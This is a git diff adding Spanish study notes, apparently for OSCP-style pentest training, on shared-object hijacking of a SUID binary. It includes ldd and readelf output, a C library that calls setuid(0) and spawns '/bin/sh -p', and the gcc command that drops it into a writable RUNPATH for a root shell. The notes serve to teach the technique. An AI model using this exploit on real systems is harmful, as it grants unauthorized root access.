@@ -396,3 +396,104 @@ https://unixhealthcheck.com/blog?id=363
 https://c0nd4.medium.com/oscp-privilege-escalation-guide-4b3623f57d71
 
 https://medium.com/@dw3113r/active-directory-attack-cheat-sheet-ea9e9744028d	
+	
+	
+## Shared Object Hijacking
+	
+En este punto se dice que los programas en desarrollo a menudo tienen permisos SUID ( permiten ejecutar un comando como otro usuario el owner).
+para el ejemplo usan un programa que le llaman "payroll"
+	
+
+	
+	
+###  ldd command
+	
+Este comando permite ver las shared libraries que usa un programa.
+	
+> print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
+	
+```
+ ldd payroll
+
+linux-vdso.so.1 =>  (0x00007ffcb3133000)
+libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+	
+```
+	
+### readelf command
+	
+>We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.
+	
+```
+	
+readelf -d payroll  | grep PATH
+	
+ 0x000000000000001d (RUNPATH)            Library runpath: [/development]	
+	
+```	
+
+En este caso es irreal y algo de suerte porque este ejecutable supuestamente en desarrollo ejecuta librerias desde ese directorio 
+lo que aqui te dicen es que pongas una libreria fake ahi y ejecutes una shell pero veo dificil que en el mundo real pase esto.
+	
+![image](https://user-images.githubusercontent.com/63270579/209449481-3e4e1fd3-0123-421e-8d25-3d7f3fc6e3e9.png)
+	
+	
+Entonces en resumen compilan y ponen la libreria .so en la ruta posteriormente checan si la esta detectando con el ld. Finalmente ejecutan y ven que 
+funcion es la que se invoca desde esa libreria .so y crean un programa en c con una funcion de ese nombre:
+	
+```
+#include<stdio.h>
+#include<stdlib.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+	
+```
+	
+Compilando
+	
+	
+```
+gcc src.c -fPIC -shared -o /development/libshared.so
+```	
+	
+Copian dicha libreria a la carpeta development que fue la que se detecto ejecutan el programa y este regresa una shell con perminsos de root.
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
